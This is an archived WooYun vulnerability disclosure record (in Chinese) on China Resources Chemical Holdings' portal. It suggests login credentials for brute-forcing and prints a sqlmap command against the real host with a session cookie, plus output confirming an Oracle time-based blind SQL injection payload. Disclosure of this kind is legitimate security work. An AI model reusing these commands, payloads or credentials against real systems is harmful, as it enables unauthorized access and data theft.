{"id": 26171, "wybug_id": "wooyun-2015-0129388", "wybug_title": "华润化工控股有限公司信息门户设置缺陷/sql注入", "wybug_corp": "华润化工控股有限公司", "wybug_author": "凌零1", "wybug_date": "2015-07-28 12:39", "wybug_open_date": "2015-07-30 14:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 昨晚看到有人上交华润的，大清早就来看看咯！！ 详细说明：  http://eip.crcchem.com/login/Login.jsp?logintype=1用户名就猜猜吧！直接是站名crcchem，而且提示用户名错误，那就给我们爆破提供了机会crcchemabc12345\n\n\n\n   漏洞证明：  后台看看，有注入，仅测试了一处，应该还有其他点，就不多测试了；http://eip.crcchem.com/homepage/Homepage.jsp?hpid=61&subCompanyId=21&isfromportal=1&isfromhp=0\nC:\\Python27\\sqlmap>sqlmap.py -u \"http://eip.crcchem.com/homepage/Homepage.jsp?hpid=61&subCompanyId=21&isfromportal=1&isfromhp=0\" -p \"hpid\" --cookie \"testBanCookie=test; JSESSIONID=abcmHSSRt405C4B6i8h7u; loginfileweaver=%2Fwui%2Ftheme%2Fecology7%2Fpage%2Flogin.jsp%3FtemplateId%3D21%26logintype%3D1%26gopage%3D; loginidweaver=1357; languageidweaver=7\"         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150609}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 09:21:46[09:21:47] [INFO] testing connection to the target URL[09:21:49] [INFO] testing if the target URL is stable. This can take a couple of seconds[09:21:51] [INFO] target URL is stable[09:21:51] [WARNING] heuristic (basic) test shows that GET parameter 'hpid' might not be injectable[09:21:52] [INFO] heuristic (XSS) test shows that GET parameter 'hpid' might bevulnerable to XSS attacks[09:21:52] [INFO] testing for SQL injection on GET parameter 'hpid'[09:21:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[09:21:53] [WARNING] reflective value(s) found and filtering out[09:22:04] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'[09:22:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'[09:22:11] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[09:22:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[09:22:20] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[09:22:28] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[09:22:28] [INFO] testing 'MySQL inline queries'[09:22:29] [INFO] testing 'PostgreSQL inline queries'[09:22:30] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[09:22:31] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'[09:22:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'[09:22:40] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'[09:22:45] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'[09:22:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'[09:22:54] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[09:22:59] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[09:23:04] [INFO] testing 'Oracle AND time-based blind'[09:24:05] [INFO] GET parameter 'hpid' seems to be 'Oracle AND time-based blind' injectableit looks like the back-end DBMS is 'Oracle'. Do you want to skip test payloads specific for other DBMSes? [Y/n] nfor the remaining tests, do you want to include all tests for 'Oracle' extending provided level (1) and risk (1) values? [Y/n][09:24:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[09:24:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[09:24:29] [INFO] checking if the injection point on GET parameter 'hpid' is a false positive[09:24:59] [WARNING] there is a possibility that the target (or WAF) is dropping 'suspicious' requestsGET parameter 'hpid' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 115 HTTP(s) requests:---Parameter: hpid (GET)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: hpid=61 AND 1918=DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(121)||CHR(117)||CHR(122),5)&subCompanyId=21&isfromportal=1&isfromhp=0---[09:26:34] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle\n\n\n   修复方案：  在登陆处加个验证码什么的，后台注入问题就多过滤吧！   版权声明：转载请注明来源 凌零1@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-30 14:10 厂商回复： wooyun-2015-重复了，发现时已经在整改密码策略和全局过滤注入了 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-30 19:47 |    \t\t乌云一朵朵 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 看那乌云一朵朵。)\t\t \n  @凌零1sqlmap导出数据时中文是乱码怎么解决，已经在sqlmap.py里面第二行添加了 #-*-coding:utf-8-*- 但是不起作用    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}